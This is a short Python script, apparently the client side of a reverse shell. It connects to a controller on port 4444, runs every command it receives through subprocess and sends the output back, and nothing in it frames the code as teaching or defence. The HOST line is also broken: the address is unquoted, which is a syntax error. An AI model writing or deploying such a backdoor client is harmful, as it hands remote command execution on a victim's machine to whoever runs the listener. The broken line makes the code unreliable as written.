import socket
import subprocess

HOST = 0.0.0.0
PORT = 4444
SIZE = 1024

# create the socket object
s = socket.socket()
# connect to the server
s.connect((HOST, PORT))

# receive the greeting message
message = s.recv(SIZE).decode()
print("Server:", message)

while True:
    # receive the command from the server
    command = s.recv(SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
# close client connection
s.close()
